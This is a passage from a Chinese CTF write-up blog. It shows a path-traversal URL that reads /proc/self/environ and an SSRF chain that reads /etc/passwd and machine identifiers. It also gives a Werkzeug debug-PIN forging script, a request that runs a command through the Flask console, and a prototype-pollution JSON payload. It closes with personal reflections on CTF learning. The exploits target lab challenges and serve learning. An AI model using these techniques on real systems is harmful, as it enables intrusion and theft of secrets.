        IS_FILE_EXIST_IN_STORAGE = fs.existsSync(path.resolve(CONFIG.storage_path, hash_fn))
    } catch (e) {
        ctx.set("X-Error-Reason", "Internal Server Error");
        ctx.status = 500; // Internal Server Error
        return ctx.res.end();
    }
    if (!IS_FILE_EXIST_IN_STORAGE) {
        logger.error(`File ${hash_fn.yellow} not found in storage, but exist in database!`)
        ctx.set("X-Error-Reason", "Internal Server Error");
        ctx.status = 500; // Internal Server Error
        return ctx.res.end();
    }

    // 文件名处理
    let filename = typeof custom_fn === "string" ? custom_fn : (await DriveUtil.getFilename(from_uid, hash));
    filename = filename.replace(/[\\\/\:\*\"\'\<\>\|\?\x00-\x1F\x7F]/gi, "_")

    // 发送
    ctx.set("Content-Disposition", `attachment; filename*=UTF-8''${encodeURIComponent(filename)}`);
    // ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn))
    await ctx.sendFile(path.resolve(CONFIG.storage_path, hash_fn)).catch(e => {
        logger.error(`Error while sending file ${hash_fn.yellow}`)
        logger.error(e)
        ctx.status = 500; // Internal Server Error
        return ctx.res.end();
    })
})

module.exports = router;

```

进行目录穿越即可

```
/s/5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron?from_uid=100000
```

## pppython?

https://www.cnblogs.com/m1xian/p/18528813

```php
<?php
    
    if ($_REQUEST['hint'] == ["your?", "mine!", "hint!!"]){
        header("Content-type: text/plain");
        system("ls / -la");
        exit();
    }
    
    try {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $_REQUEST['lolita']);
        $output = curl_exec($ch);
        echo $output;
        curl_close($ch);   
    }catch (Error $x){
        highlight_file(__FILE__);
        highlight_string($x->getMessage());
    }

?> curl_setopt(): The CURLOPT_HTTPHEADER option must have an array value

```

直接数组过，然后文件读取

```
?hint[0]=your?&hint[1]=mine!&hint[2]=hint!!

?url=file:///app.py&lolita[]=
```

```python
from flask import Flask, request, session, render_template, render_template_string
import os
import base64
# from NeepuF1Le import neepu_files

app = Flask(__name__)
app.config['SECRET_KEY'] = '******'

@app.route('/')
def welcome():
    if session.get("islogin") == True:
        return "flag{***********************}"

if __name__ == '__main__':
    app.run('0.0.0.0', 1314, debug=True)

```

开启 debug模式，并且可以读取文件，打pin值

```
?url=file:///etc/passwd&lolita[]=
得到root


flask.app
Flask

?url=file:///sys/class/net/eth0/address&lolita[]=
f6:f5:77:8b:67:8d 1

?url=file:///etc/machine-id&lolita[]=
1


?url=file:///proc/sys/kernel/random/boot_id&lolita[]=
a7cf87a4-f7b3-4edd-93e3-854e78d97842 1

?url=file:///proc/self/cgroup&lolita[]=
-0f93015de51c77ebb8fd14065c835b0040120ffb05e60158b3d8bffc59e265e4.scope


# NeepuF1Le 是什么python版本才出现的 -> neupy python 3.10
/usr/local/lib/python3.10/dist-packages/flask/app.py
```

最后整理一下

```
root
flask.app
Flask
/usr/local/lib/python3.10/dist-packages/flask/app.py
271534133045133
a7cf87a4-f7b3-4edd-93e3-854e78d97842-0f93015de51c77ebb8fd14065c835b0040120ffb05e60158b3d8bffc59e265e4.scope
```

但是这是`python3.10`好像不能用于之前的脚本，之前都是3.8最高

```python
import hashlib
from itertools import chain
import time
probably_public_bits = [
    'root'  
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.10/site-packages/flask/app.py'
]

private_bits = [
    '271534133045133',  
    'a7cf87a4-f7b3-4edd-93e3-854e78d97842-0f93015de51c77ebb8fd14065c835b0040120ffb05e60158b3d8bffc59e265e4.scope'
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)

def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]

print(cookie_name + "=" + f"{int(time.time())}|{hash_pin(rv)}")

```

得到`107-667-381`和`__wzd03fbc8a0ce3cfdab3d2e=1754745570|65ee6ca6bbab`

访问console来获得`secret`和`frm`，没有报错`frm`默认为0

```
?url=http://localhost:1314/console&lolita[]=
JbjRr8rMsX31cclteJRo
```

再来ssrf这里

```
?lolita[]=Cookie:__wzd03fbc8a0ce3cfdab3d2e=1754745570|65ee6ca6bbab&url=http://127.0.0.1:1314/console?__debugger__=yes&pin=107-667-381&cmd=__import__("os").popen("cat%2B/flag").read()&frm=0&s=JbjRr8rMsX31cclteJRo
```

## OtenkiBoy

```http
POST /submit HTTP/1.1
Host: 88e6e9a7-4df0-4f84-9c6c-623688a9f061.node5.buuoj.cn:81
Content-Length: 176
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://88e6e9a7-4df0-4f84-9c6c-623688a9f061.node5.buuoj.cn:81
Referer: http://88e6e9a7-4df0-4f84-9c6c-623688a9f061.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Connection: close

{
  "contact":"a", "reason":"a",
  "constructor":{
    "prototype":{
      "format": "yy19-MM-ddTHH:mm:ss.fffZ",
      "baseDate":"aaa",
      "fff": "bbb"
    }
  }
}
```

## 聊聊

你居然看到了这里？突然想起来去年我以为太菜而晚上失眠（十二点多才睡着，虽然现在已经是家常），太菜主要是两个点，第一个是nepCTF，我已经学了快半年了当时，还是做不出来什么题，甚至说自己看代码都难得很，还有一个就是出题，newstar这类的新生赛，我是一个邀请都没有。没人知道我，更没人会记得我。

于是我就开始骚扰我的师父，他工作强度还是挺高的，我一个人发了二十多条信息，叽里呱啦的，但是他一条也没回（心想最后的依靠都没了），过了一分钟，“明年你如果想出题的话，我可以帮你搞定这件事”。这次骚扰的原因，其实还是自尊心作祟，因为当时的出题人web里面真不是特别厉害，我觉得我应该是比他们要略微强一丢丢的，但是我却没有这样的机会www。

忽而都已经过去一年了，之前差点爆零的nepCTF也是能做最后一题了，而且心态变化，现在你可能让我去出这种新生赛的题我都不大愿意了（base可以），年初和去年末很多新生赛，mmp，都是打着新生赛的旗号，展示自己的，有些东西你能遇到我吃，就拿某GAME和昨年五个学校联合（黑龙江理工在内，名字忘了），主要吐槽两个题，一个比赛一个（不偏爱哈），一个是某NDAY的复现，利用条件极其苛刻，另一个是http，里面的http头我一个都不知道，真就一点都没见过。

这两天花时间做了做23年的newstar，发现我竟然还是能从新生赛里面学到东西，令我形象深刻更是。但是年初和去年末这段时间的新生赛，我基本就没学到什么东西了，更何况是去年的我，甚至你问我做过的题，我可能一点形象都没有。

说到最后其实就是想让看到这里的师傅，出题的师傅尽量不要套，更不要脑洞，就分享自己最近研究的姿势就可以了，特别是别随便甩个冷门NDAY（这不傻*吗）。最近会有一个LILCTF，里面的师傅水平都和我差不多、更好，既然是打了“初心”的旗号的，我觉得可以冲（我要和suer参加国际赛就不来了），预祝LILCTF顺利举办。

还有一个CTF就是SU Junior，我看了文档的，简直就是分站赛级别的精华题目，可别错过嗷，暂时还有定档，肯定是在九、十月！
